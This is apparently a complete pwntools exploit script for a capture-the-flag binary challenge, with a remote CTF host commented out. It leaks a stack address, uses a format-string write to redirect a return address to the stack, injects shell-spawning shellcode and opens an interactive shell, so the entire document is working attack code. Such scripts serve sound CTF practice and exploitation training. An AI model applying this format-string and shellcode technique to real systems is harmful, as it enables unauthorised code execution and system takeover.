from pwn import *
context.log_level = 'debug'
io = process('./pwn')
#io = remote('pwn.challenge.ctf.show',28242)
io.sendlineafter('Quit!!!\n','1')
stack = int(io.recvuntil('\n'),16)
ret = stack + 0x41c
payload = fmtstr_payload(16,{ret:stack})
io.sendline(payload)
io.sendlineafter('Quit!!!\n','2')
io.sendlineafter('Quit!!!\n','1')
io.sendline(asm(shellcraft.sh()))
io.sendlineafter('Quit!!!\n','3')
io.interactive()
